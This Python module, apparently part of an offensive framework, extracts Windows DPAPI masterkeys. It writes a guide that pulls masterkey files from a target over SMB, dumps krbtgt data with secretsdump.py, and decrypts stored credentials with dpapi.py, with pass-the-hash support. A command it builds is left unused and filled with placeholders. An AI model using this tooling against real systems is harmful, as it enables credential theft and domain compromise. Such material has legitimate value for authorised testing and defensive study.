#!/usr/bin/env python3
"""
DPAPI Masterkey Extraction Module  
Extracts and decrypts DPAPI masterkeys for credential recovery
"""
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

def extract_dpapi_keys(session_dir, target_ip, domain, username, password=None, ntlm_hash=None):
    """Extract DPAPI masterkeys using Impacket"""
    global logger
    setup_logger("dpapi_extract", session_dir)
    logger = get_logger("dpapi_extract")
    
    logger.info(f"Extracting DPAPI masterkeys from {target_ip}")
    
    # Build credential string
    if password:
        cred_string = f"{domain}/{username}:{password}"
        hash_arg = []
    elif ntlm_hash:
        cred_string = f"{domain}/{username}"
        hash_arg = ["-hashes", f":{ntlm_hash}"]
    else:
        logger.error("No credentials provided")
        return
    
    output_dir = os.path.join(session_dir, "dpapi_keys")
    os.makedirs(output_dir, exist_ok=True)
    
    # Step 1: Get user's SID
    logger.info("Retrieving user SID...")
    
    # Step 2: Use dpapi.py from Impacket
    logger.info("Dumping DPAPI masterkeys...")
    
    cmd = [
        "dpapi.py",
        "masterkey",
        "-file", "%APPDATA%\\Microsoft\\Protect\\<SID>\\*",  # Would need actual path
        "-sid", "<USER_SID>",
        "-password", password if password else ""
    ]
    
    # Create instructions instead (dpapi.py needs local files)
    instructions_file = os.path.join(output_dir, "dpapi_extraction_guide.txt")
    
    with open(instructions_file, 'w') as f:
        f.write("# DPAPI Masterkey Extraction Guide\n\n")
        f.write("## Prerequisites\n")
        f.write(f"Target: {target_ip}\n")
        f.write(f"Domain: {domain}\n")
        f.write(f"User: {username}\n\n")
        
        f.write("## Step 1: Download Masterkey Files\n")
        f.write(f"```bash\n")
        f.write(f"smbclient.py {cred_string}@{target_ip}\n")
        f.write(f"cd C$\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Protect\\\n")
        f.write(f"get *\n")
        f.write(f"```\n\n")
        
        f.write("## Step 2: Get Domain Backup Key (if Domain Admin)\n")
        f.write(f"```bash\n")
        f.write(f"secretsdump.py {cred_string}@{target_ip} -just-dc-user krbtgt\n")
        f.write(f"# Extract DPAPI_SYSTEM key from output\n")
        f.write(f"```\n\n")
        
        f.write("## Step 3: Decrypt Masterkeys\n")
        f.write(f"```bash\n")
        f.write(f"dpapi.py masterkey -file <masterkey_file> -sid <USER_SID> -password {password if password else '<password>'}\n")
        f.write(f"# OR with domain backup key:\n")
        f.write(f"dpapi.py masterkey -file <masterkey_file> -pvk <domain_backupkey.pvk>\n")
        f.write(f"```\n\n")
        
        f.write("## Step 4: Decrypt Credentials\n")
        f.write(f"```bash\n")
        f.write(f"dpapi.py credential -file <Credentials_file> -masterkey <decrypted_masterkey>\n")
        f.write(f"```\n")
    
    logger.info(f"DPAPI extraction instructions: {instructions_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    parser.add_argument("--ntlm-hash")
    args = parser.parse_args()
    
    extract_dpapi_keys(args.session_dir, args.target_ip, args.domain,
                      args.username, args.password, args.ntlm_hash)
